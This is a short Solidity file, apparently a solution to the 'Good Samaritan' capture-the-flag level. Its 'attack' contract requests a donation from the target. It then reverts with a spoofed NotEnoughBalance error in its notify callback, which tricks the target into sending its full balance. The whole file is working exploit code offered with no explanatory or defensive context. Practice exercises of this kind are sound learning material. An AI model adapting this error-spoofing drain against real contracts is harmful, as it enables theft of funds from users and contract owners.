// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./target.sol";

contract attack
{
    GoodSamaritan target;

    error NotEnoughBalance();
    
    constructor(address target_addr)
    {
        target = GoodSamaritan(target_addr);
    }

    function notify(uint256 amount) external 
    {
        if (amount == 10)
        {
            revert NotEnoughBalance();
        }
    }

    function attack_fun() public
    {
        target.requestDonation();
    }
}